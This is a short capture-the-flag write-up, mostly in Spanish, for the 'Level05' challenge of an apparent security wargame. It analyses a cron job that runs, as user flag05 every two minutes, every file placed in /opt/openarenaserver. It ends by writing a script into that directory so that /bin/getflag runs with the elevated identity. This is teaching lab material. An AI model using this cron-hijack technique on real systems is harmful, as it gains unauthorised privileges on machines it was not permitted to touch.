Level05 Arbitrary Script Execution via Writable Directory/ Cron job
You have new mail.
	cat /var/mail/level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
Ejecución automática y frecuencia
*/2 * * * * Los cinco asteriscos representan el formato de Crontab. El */2 significa que esta tarea se ejecuta cada 2 minutos, todos los días, a todas horas.
Implicación: Si logras manipular algo, no tienes que esperar mucho para que el sistema lo ejecute.
Privilegios elevados
su -c "... " - flagxx: El comando su con un guion seguido de un nombre de usuario indica que el comando se ejecutará con la identidad de flagxx.
Deducción: Cualquier cosa que ocurra dentro de ese comando tiene los permisos de flagxx. Tu objetivo es "secuestrar" esa ejecución.
	ls -l /usr/sbin/openarenaserver
	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
	cat /usr/sbin/op…
		#!/bin/sh
		for i in /opt/openarenaserver/* ; do
			(ulimit -t 5; bash -x "$i")
			rm -f "$i"
		done
getfacl :  para visualizar las Listas de Control de Acceso (ACLs) de archivos y directorios.
Analisis
El + significa: Access Control Lists (ACL) adicionales están aplicada. Hay permisos extra fuera del sistema clásico UNIX
for i in /opt/openarenaserver/* ; do : recorre todos los archivos dentro del directorio /opt/openarenaserver/ y los guarda uno a uno en la variable $i.
ulimit -t 5; : Limita el tiempo del CPU a 5 segundos evita script infinitos.
bash -x "$i" : Ejecuta el archivo $i con bash; -x = debug mode.
Procedure : 
	cat << 'EOF' > /opt/openarenaserver/pwn.sh
		#!/bin/bash
		/bin/getflag > /tmp/hackeado.txt
	EOF
	chmod +x pwn.sh
